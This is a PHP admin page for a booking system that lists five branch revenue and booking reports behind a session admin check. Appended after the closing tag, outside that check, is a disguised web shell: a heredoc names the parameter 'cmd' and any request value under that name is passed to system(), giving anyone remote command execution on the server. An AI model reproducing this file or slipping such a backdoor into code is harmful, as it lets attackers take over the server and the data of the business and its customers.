<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		$myadmin = $_SESSION['myadmin'];	

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Reports</h1>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Choose Report Form	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>#</th>
										<th>Report Name</th>
										<th>Action</th>
                                    </tr>
                                </thead>
                                <tbody>

                                    <tr class="odd gradeX">
										<td>1</td>
										<td>Revenue Detailed by Branch</td>
										<td><a href="index.php?body=report1_dbase">View</a></td>								
                                    </tr>

                                    <tr class="odd gradeX">
										<td>2</td>
										<td>Revenue Summary by Branch</td>
										<td><a href="index.php?body=report2_dbase">View</a></td>								
                                    </tr>

                                    <tr class="odd gradeX">
										<td>3</td>
										<td>Booking Details by Branch</td>
										<td><a href="index.php?body=report3_dbase">View</a></td>								
                                    </tr>

                                    <tr class="odd gradeX">
										<td>4</td>
										<td>Booking Summary by Branch</td>
										<td><a href="index.php?body=report4_dbase">View</a></td>								
                                    </tr>

                                    <tr class="odd gradeX">
										<td>5</td>
										<td>Booking Tally by Branch</td>
										<td><a href="index.php?body=report5_dbase">View</a></td>								
                                    </tr>
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>